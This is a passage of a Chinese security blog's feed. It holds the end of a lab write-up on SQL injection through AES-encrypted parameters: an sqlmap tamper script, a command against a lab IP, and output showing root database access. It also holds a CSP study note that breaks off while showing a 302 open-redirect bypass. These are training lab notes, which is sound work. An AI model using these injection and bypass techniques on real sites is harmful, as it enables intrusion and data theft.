&apos;_mozhe&apos;</span><br><span class="line">    return base64.b64encode(base64.b64encode(cipher.encrypt(pad_it(text))))</span><br><span class="line"></span><br><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    </span><br><span class="line">    return encrypt(payload)</span><br></pre></td></tr></table></figure><p>启动SQLMap,就可以直接的进行注入了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~# sqlmap -u &quot;http://219.153.49.228:42530/news/list.php?id=&quot; --tamper aes.py --current-user --current-db --is-dba</span><br><span class="line">        ___</span><br><span class="line">       __H__</span><br><span class="line"> ___ ___[(]_____ ___ ___  &#123;1.2.4#stable&#125;</span><br><span class="line">|_ -| . [,]     | .&apos;| . |</span><br><span class="line">|___|_  [&quot;]_|_|_|__,|  _|</span><br><span class="line">      |_|V          |_|   http://sqlmap.org</span><br><span class="line"></span><br><span class="line">[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&apos;s responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program</span><br><span class="line"></span><br><span class="line">[*] starting at 10:41:22</span><br><span class="line"></span><br><span class="line">[10:41:22] [INFO] loading tamper script &apos;aes&apos;</span><br><span class="line">[10:41:22] [WARNING] provided value for parameter &apos;id&apos; is empty. Please, always use only valid parameter values so sqlmap could be able to run properly</span><br><span class="line">[10:41:22] [INFO] testing connection to the target URL</span><br><span class="line">[10:41:22] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS</span><br><span class="line">[10:41:22] [INFO] testing if the target URL content is stable</span><br><span class="line">[10:41:23] [INFO] target URL content is stable</span><br><span class="line">[10:41:23] [INFO] testing if GET parameter &apos;id&apos; is dynamic</span><br><span class="line">[10:41:23] [INFO] confirming that GET parameter &apos;id&apos; is dynamic</span><br><span class="line">[10:41:23] [INFO] GET parameter &apos;id&apos; is dynamic</span><br><span class="line">[10:41:23] [WARNING] heuristic (basic) test shows that GET parameter &apos;id&apos; might not be injectable</span><br><span class="line">[10:41:23] [INFO] testing for SQL injection on GET parameter &apos;id&apos;</span><br><span class="line">[10:41:23] [INFO] testing &apos;AND boolean-based blind - WHERE or HAVING clause&apos;</span><br><span class="line">[10:41:24] [INFO] testing &apos;MySQL &gt;= 5.0 boolean-based blind - Parameter replace&apos;</span><br><span class="line">[10:41:24] [INFO] testing &apos;MySQL &gt;= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)&apos;</span><br><span class="line">[10:41:24] [INFO] testing &apos;PostgreSQL AND error-based - WHERE or HAVING clause&apos;</span><br><span class="line">[10:41:24] [INFO] testing &apos;Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)&apos;</span><br><span class="line">[10:41:25] [INFO] testing &apos;Oracle AND error-based - WHERE or HAVING clause (XMLType)&apos;</span><br><span class="line">[10:41:25] [INFO] testing &apos;MySQL &gt;= 5.0 error-based - Parameter replace (FLOOR)&apos;</span><br><span class="line">[10:41:25] [INFO] GET parameter &apos;id&apos; is &apos;MySQL &gt;= 5.0 error-based - Parameter replace (FLOOR)&apos; injectable </span><br><span class="line">it looks like the back-end DBMS is &apos;MySQL&apos;. Do you want to skip test payloads specific for other DBMSes? [Y/n] </span><br><span class="line">for the remaining tests, do you want to include all tests for &apos;MySQL&apos; extending provided level (1) and risk (1) values? [Y/n] </span><br><span class="line">[10:41:27] [INFO] testing &apos;Generic UNION query (NULL) - 1 to 20 columns&apos;</span><br><span class="line">[10:41:27] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found</span><br><span class="line">GET parameter &apos;id&apos; is vulnerable. Do you want to keep testing the others (if any)? [y/N] </span><br><span class="line">sqlmap identified the following injection point(s) with a total of 64 HTTP(s) requests:</span><br><span class="line">---</span><br><span class="line">Parameter: id (GET)</span><br><span class="line">    Type: error-based</span><br><span class="line">    Title: MySQL &gt;= 5.0 error-based - Parameter replace (FLOOR)</span><br><span class="line">    Payload: id=(SELECT 3997 FROM(SELECT COUNT(*),CONCAT(0x7170626271,(SELECT (ELT(3997=3997,1))),0x717a717171,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)</span><br><span class="line">---</span><br><span class="line">[10:41:28] [WARNING] changes made by tampering scripts are not included in shown payload content(s)</span><br><span class="line">[10:41:28] [INFO] the back-end DBMS is MySQL</span><br><span class="line">web server operating system: Linux Ubuntu</span><br><span class="line">web application technology: Nginx</span><br><span class="line">back-end DBMS: MySQL &gt;= 5.0</span><br><span class="line">[10:41:28] [INFO] fetching current user</span><br><span class="line">[10:41:28] [INFO] retrieved: root@localhost</span><br><span class="line">current user:    &apos;root@localhost&apos;</span><br><span class="line">[10:41:28] [INFO] fetching current database</span><br><span class="line">[10:41:29] [INFO] retrieved: mozhe_Discuz_StormGroup</span><br><span class="line">current database:    &apos;mozhe_Discuz_StormGroup&apos;</span><br><span class="line">[10:41:29] [INFO] testing if current user is DBA</span><br><span class="line">[10:41:29] [INFO] fetching current user</span><br><span class="line">current user is DBA:    True</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;!-- ttoc --&gt;
&lt;p&gt;今天遇到了一个AES加密后的SQL注入。之前很少接触AES加解密的知识，因为CTF打的少的原因。&lt;/p&gt;
&lt;h3&gt;&lt;span id=&quot;代码分析&quot;&gt;代码分析&lt;/span&gt;&lt;/h3&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;t
      
    
    </summary>
    
      <category term="笔记" scheme="https://uknowsec.cn/categories/notes/"/>
    
    
  </entry>
  
  <entry>
    <title>内容安全策略(CSP)学习笔记</title>
    <link href="https://uknowsec.cn/posts/notes/%E5%86%85%E5%AE%B9%E5%AE%89%E5%85%A8%E7%AD%96%E7%95%A5-CSP-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.html"/>
    <id>https://uknowsec.cn/posts/notes/内容安全策略-CSP-学习笔记.html</id>
    <published>2018-08-06T11:33:43.000Z</published>
    <updated>2019-01-07T08:24:19.823Z</updated>
    
    <content type="html"><![CDATA[<!-- ttoc --><h2><span id="csp基础知识">CSP基础知识</span></h2><h3><span id="简介">简介</span></h3><p>内容安全策略(CSP)是一种web应用技术用于帮助缓解大部分类型的内容注入攻击，包括XSS攻击和数据注入等，这些攻击可实现数据窃取、网站破坏和作为恶意软件分发版本等行为。该策略可让网站管理员指定客户端允许加载的各类可信任资源。</p><h3><span id="开启csp的两种方法">开启CSP的两种方法</span></h3><ul><li><p>一种是通过 HTTP 头信息的<code>Content-Security-Policy</code>的字段 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">header(&quot;Content-Security-Policy: default-src https:; report-uri /csp-violation-report-endpoint/&quot;);</span><br></pre></td></tr></table></figure></li></ul><ul><li><p>另一种是通过网页的<code>&lt;meta&gt;</code>标签。 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;script-src &apos;self&apos;; object-src &apos;none&apos;; style-src cdn.example.org third-party.org; child-src https:&quot;&gt;</span><br></pre></td></tr></table></figure><blockquote><ul><li>脚本：只信任当前域名</li><li><code>&lt;object&gt;</code>标签：不信任任何URL，即不加载任何资源</li><li>样式表：只信任<code>cdn.example.org</code>和<code>third-party.org</code></li><li>框架（frame）：必须使用HTTPS协议加载</li><li>其他资源：没有限制</li></ul></blockquote><p>启用后，不符合 CSP 的外部资源就会被阻止加载。</p></li></ul><h3><span id="限制选项">限制选项</span></h3><h4><span id="资源加载限制">资源加载限制</span></h4><ul><li><strong>script-src</strong>：外部脚本</li><li><strong>style-src</strong>：样式表</li><li><strong>img-src</strong>：图像</li><li><strong>media-src</strong>：媒体文件（音频和视频）</li><li><strong>font-src</strong>：字体文件</li><li><strong>object-src</strong>：插件（比如 Flash）</li><li><strong>child-src</strong>：框架</li><li><strong>frame-ancestors</strong>：嵌入的外部资源（比如frame、iframe、embed和applet）</li><li><strong>connect-src</strong>：HTTP 连接（通过 XHR、WebSockets、EventSource等）</li><li><strong>worker-src</strong>：<code>worker</code>脚本</li><li><strong>manifest-src</strong>：manifest 文件</li></ul><h4><span id="default-src">default-src</span></h4><p><code>default-src</code>用来设置上面各个选项的默认值。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &apos;self&apos;</span><br></pre></td></tr></table></figure><p>上面代码限制<strong>所有的</strong>外部资源，都只能从当前域名加载。</p><p>如果同时设置某个单项限制（比如<code>font-src</code>）和<code>default-src</code>，前者会覆盖后者，即字体文件会采用<code>font-src</code>的值，其他资源依然采用<code>default-src</code>的值。</p><h4><span id="url限制">URL限制</span></h4><p>有时，网页会跟其他 URL 发生联系，这时也可以加以限制。</p><blockquote><ul><li><strong>frame-ancestors</strong>：限制嵌入框架的网页</li><li><strong>base-uri</strong>：限制<code>&lt;base#href&gt;</code></li><li><strong>form-action</strong>：限制<code>&lt;form#action&gt;</code></li></ul></blockquote><h4><span id="其他限制">其他限制</span></h4><p>其他一些安全相关的功能，也放在了 CSP 里面。</p><blockquote><ul><li><strong>block-all-mixed-content</strong>：HTTPS 网页不得加载 HTTP 资源（浏览器已经默认开启）</li><li><strong>upgrade-insecure-requests</strong>：自动将网页上所有加载外部资源的 HTTP 链接换成 HTTPS 协议</li><li><strong>plugin-types</strong>：限制可以使用的插件格式</li><li><strong>sandbox</strong>：浏览器行为的限制，比如不能有弹出窗口等。</li></ul></blockquote><h4><span id="report-uri">report-uri</span></h4><p>有时，我们不仅希望防止 XSS，还希望记录此类行为。<code>report-uri</code>就用来告诉浏览器，应该把注入行为报告给哪个网址。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: default-src &apos;self&apos;; ...; report-uri /my_amazing_csp_report_parser;</span><br></pre></td></tr></table></figure><p>上面代码指定，将注入行为报告给<code>/my_amazing_csp_report_parser</code>这个 URL。</p><p>浏览器会使用<code>POST</code>方法，发送一个JSON对象。</p><h3><span id="选项值">选项值</span></h3><p>每个限制选项可以设置以下几种值，这些值就构成了白名单。</p><blockquote><ul><li>主机名：<code>example.org</code>，<code>https://example.com:443</code></li><li>路径名：<code>example.org/resources/js/</code></li><li>通配符：<code>*.example.org</code>，<code>*://*.example.com:*</code>（表示任意协议、任意子域名、任意端口）</li><li>协议名：<code>https:</code>、<code>data:</code></li><li>关键字<code>&#39;self&#39;</code>：当前域名，需要加引号</li><li>关键字<code>&#39;none&#39;</code>：禁止加载任何外部资源，需要加引号</li></ul></blockquote><p>多个值也可以并列，用空格分隔。 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: script-src &apos;self&apos; https://apis.google.com</span><br></pre></td></tr></table></figure><p>如果同一个限制选项使用多次，只有第一次会生效。 </p><p>如果不设置某个限制选项，就是默认允许任何值。 </p><h3><span id="script-src的特殊值">script-src的特殊值</span></h3><p>除了常规值，<code>script-src</code>还可以设置一些特殊值。注意，下面这些值都必须放在单引号里面。</p><blockquote><ul><li><strong>‘unsafe-inline’</strong>：允许执行页面内嵌的<code>&lt;script&gt;</code>标签和事件监听函数</li><li><strong>‘unsafe-eval</strong>‘：允许将字符串当作代码执行，比如使用<code>eval</code>、<code>setTimeout</code>、<code>setInterval</code>和<code>Function</code>等函数。</li><li><strong>nonce值</strong>：每次HTTP回应给出一个授权token，页面内嵌脚本必须有这个token，才会执行</li><li><strong>hash值</strong>：列出允许执行的脚本代码的Hash值，页面内嵌脚本的哈希值只有吻合的情况下，才能执行。</li></ul></blockquote><p>nonce值的例子如下，服务器发送网页的时候，告诉浏览器一个随机生成的token。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: script-src &apos;nonce-EDNnf03nceIOfn39fn3e9h3sdfa&apos;</span><br></pre></td></tr></table></figure><p>页面内嵌脚本，必须有这个token才能执行。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script nonce=EDNnf03nceIOfn39fn3e9h3sdfa&gt;</span><br><span class="line">   // some code</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>hash值的例子如下，服务器给出一个允许执行的代码的hash值。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy: script-src &apos;sha256-qznLcsROx4GACP2dm0UCKCzCG-HiZ1guq6ZZDob_Tng=&apos;</span><br></pre></td></tr></table></figure><p>下面的代码就会允许执行，因为hash值相符。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&apos;Hello, world.&apos;);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>注意，计算hash值的时候，script标签不算在内。</p><p>除了<code>script-src</code>选项，nonce值和hash值还可以用在<code>style-src</code>选项，控制页面内嵌的样式表。</p><h3><span id="注意点">注意点</span></h3><p>（1）<code>script-src</code>和<code>object-src</code>是必设的，除非设置了<code>default-src</code>。</p><p>因为攻击者只要能注入脚本，其他限制都可以规避。而<code>object-src</code>必设是因为 Flash 里面可以执行外部脚本。</p><p>（2）<code>script-src</code>不能使用<code>unsafe-inline</code>关键字（除非伴随一个nonce值），也不能允许设置<code>data:</code>URL。</p><p>（3）必须特别注意 JSONP 的回调函数。 </p><h2><span id="csp实验">CSP实验</span></h2><h4><span id="实验1-csp测试">实验1 CSP测试</span></h4><h5><span id="实验代码解析">实验代码解析</span></h5><p>index.html</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;title&gt;内容安全策略 (CSP)&lt;/title&gt;</span><br><span class="line">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;script-src &apos;self&apos;; object-src &apos;none&apos;; style-src cdn.bootcss.com; child-src https:&quot;&gt;</span><br><span class="line">&lt;script src=&quot;//cdn.bootcss.com/jquery/3.0.0/jquery.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=&quot;/localhost.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;link rel=&quot;stylesheet&quot; href=&quot;//cdn.bootcss.com/weui/0.4.0/style/weui.min.css&quot;/&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;img src=&quot;https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/QQ%E5%9B%BE%E7%89%8720180413234055.png&quot; height=&quot;300&quot; width=&quot;300&quot;&gt;</span><br><span class="line">&lt;iframe src=&quot;http://app.uknowsec.cn&quot; width=&quot;200&quot; height=&quot;200&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;iframe src=&quot;https://uknowsec.cn&quot; width=&quot;200&quot; height=&quot;200&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>localhost.js</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">document.write(&quot;&lt;h1&gt;This is a local js.&lt;/h1&gt;&quot;);</span><br></pre></td></tr></table></figure><p>从上面的HTML文件可以看到    ，我们利用<code>meta</code>标签对页面进行开启<code>csp</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;meta http-equiv=&quot;Content-Security-Policy&quot; content=&quot;script-src &apos;self&apos;; object-src &apos;none&apos;; style-src cdn.bootcss.com; child-src https:&quot;&gt;</span><br></pre></td></tr></table></figure><ul><li>脚本：只信任当前域名</li><li><code>&lt;object&gt;</code>标签：不信任任何URL，即不加载任何资源</li><li>样式表：只信任<code>cdn.bootcss.com</code></li><li>框架（frame）：必须使用HTTPS协议加载</li><li>其他资源：没有限制</li></ul><p>可以看到我在代码中引入以下内容</p><ul><li><p>引用外部和当前域的js</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&quot;//cdn.bootcss.com/jquery/3.0.0/jquery.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;script src=&quot;/localhost.js&quot;&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure></li><li><p>引用外部的样式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;link rel=&quot;stylesheet&quot; href=&quot;//cdn.bootcss.com/weui/0.4.0/style/weui.min.css&quot;/&gt;</span><br></pre></td></tr></table></figure></li><li><p>HTTPS协议和HTTP协议的frame</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=&quot;http://app.uknowsec.cn&quot; width=&quot;200&quot; height=&quot;200&quot;&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;iframe src=&quot;https://uknowsec.cn&quot; width=&quot;200&quot; height=&quot;200&quot;&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure></li><li><p>其他图片资源</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=&quot;https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/QQ%E5%9B%BE%E7%89%8720180413234055.png&quot; height=&quot;300&quot; width=&quot;300&quot;&gt;</span><br></pre></td></tr></table></figure><h5><span id="实验运行结果">实验运行结果</span></h5><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/csp_1.jpg" alt="csp_1"></p><p>由实验截图可以看到</p></li><li><p>外部的资源引用失败，控制台给出了报错信息</p></li><li>HTTP协议的frame加载失败，控制台给出了报错信息</li><li>其他可以加载的img资源和本地的js脚本都加载成功</li></ul><h4><span id="实验2-report-uri测试">实验2 report-uri测试</span></h4><p>尽管<a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/report-to" target="_blank" rel="noopener"><code>report-to</code></a>指令旨在取代已弃用的<code>report-uri</code>指令， <code>report-uri</code>已经从Web标准中删除，但在大多数浏览器中仍不受支持。因此，可以同时指定<code>report-to</code>和<code>report-uri</code>。</p><p>在支持的浏览器中<code>report-to</code>，<code>report-uri</code>指令将被忽略。 </p><h5><span id="实验代码解析">实验代码解析</span></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&quot;Content-Security-Policy: default-src &apos;none&apos;; style-src cdn.example.com; report-uri /csp_report&quot;);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;title&gt;内容安全策略 (CSP)&lt;/title&gt;</span><br><span class="line">&lt;link rel=&quot;stylesheet&quot; href=&quot;//cdn.bootcss.com/weui/0.4.0/style/weui.min.css&quot;/&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>在代码中我们利用的策略是限制外部非<code>cdn.example.com</code>域名下的样式表，并把报告发送到<code>/csp_report</code>目录。</p><p>我们在代码引用<code>cdn.bootcss.com/weui/0.4.0/style/weui.min.css</code>查看实验结果。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/csp_2.jpg" alt="csp_2"></p><p>由上图可以看到发送出了JSON格式的POST数据。</p><h4><span id="实验3-script-src特殊值测试">实验3 script-src特殊值测试</span></h4><h5><span id="unsafe-inline">unsafe-inline</span></h5><p>当<code>script-src</code>设置为<code>unsafe-inline</code>时允许内联脚本和内联事件处理程序。</p><p>内联脚本和内联事件处理程序就是在html中利用<code>&lt;script&gt;</code>标签加入的JS代码。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&quot;Content-Security-Policy: script-src &apos;unsafe-inline&apos;;&quot;);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;title&gt;内容安全策略 (CSP)&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">document.write(&quot;&lt;h1&gt;允许执行页面内嵌的标签和事件监听函数.&lt;/h1&gt;&quot;);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;script src=&quot;/localhost.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>在上面的代码中，我们引入了一个内联的js脚本和一个外置的js脚本，运行代码结果如下。</p><p>内联的js脚本是可以执行的，但是外置的js脚本被警报了。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/csp3.jpg" alt=""></p><h5><span id="unsafe-eval">unsafe-eval</span></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&quot;Content-Security-Policy: script-src &apos;unsafe-eval&apos; &apos;unsafe-inline&apos;&quot;);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;title&gt;内容安全策略 (CSP)&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">   eval(&apos;document.write(&quot;&lt;h1&gt;unsafe-eval测试.&lt;/h1&gt;&quot;)&apos;);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>这里我们将<code>script-src</code>值设置为<code>unsafe-eval</code>，这里还要开启内置事件的开关<code>unsafe-inline</code>才能执行内置事件。</p><p>执行结果是可以看到利用<code>eval</code>函数将字符串当作代码执行了。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/csp4.jpg" alt=""></p><h5><span id="nonce值">nonce值</span></h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&quot;Content-Security-Policy: script-src &apos;nonce-EDNnf03nceIOfn39fn3e9h3sdfa&apos;&quot;);</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">&lt;title&gt;内容安全策略 (CSP)&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;script nonce=EDNnf03nceIOfn39fn3e9h3sdfa&gt;</span><br><span class="line">   document.write(&quot;&lt;h1&gt;script nonce 测试.&lt;/h1&gt;&quot;);</span><br><span class="line">   document.write(&quot;&lt;h1&gt;nonce=EDNnf03nceIOfn39fn3e9h3sdfa.&lt;/h1&gt;&quot;);</span><br><span class="line">&lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>在上诉代码中，<code>header</code>头设置了<code>script-src &#39;nonce-EDNnf03nceIOfn39fn3e9h3sdfa&#39;</code>这里的<code>nonce</code>值对相应的</p><p><code>script</code>进行判断，如果<code>script</code>的<code>nonce</code>值与之相同，就可以执行相应的Js脚本。</p><p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/csp5.jpg" alt=""></p><h3><span id="csp的绕过">CSP的绕过</span></h3><h4><span id="302-bypass-csp">302 Bypass CSP</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> header(&quot;Content-Security-Policy: script-src http://127.0.0.1/ http://xss.cc/the_only_allow_dir/&quot;);</span><br><span class="line"> ?&gt;</span><br><span class="line"> &lt;html&gt;</span><br><span class="line"> &lt;head&gt;</span><br><span class="line"> &lt;/head&gt;</span><br><span class="line"> &lt;body&gt;</span><br><span class="line">     csp header test </span><br><span class="line">    </span><br><span class="line">     &lt;script src=&quot;/test.php?u=//xss.cc/myjs/a.js&quot;&gt;</span><br><span class="line">     &lt;/script&gt;</span><br><span class="line"> &lt;/body&gt;</span><br><span class="line"> &lt;/html&gt;</span><br></pre></td></tr></table></figure><p>如上代码：</p><p>​    CSP允许<code>http://127.0.0.1/</code>和<code>http://xss.cc/the_only_allow_dir/</code>这两个域的<code>script</code></p><p>引用。</p><p>​    这里的场景需要一个可以302跳转的文件，只要是在域内允许的都可以。这里我们在本地域内创建一个test.php文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&quot;Location: &quot; . $_GET[u]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>​    这样我们就有一个302跳转的文件。</p><p>​    在代码中还允许了<a 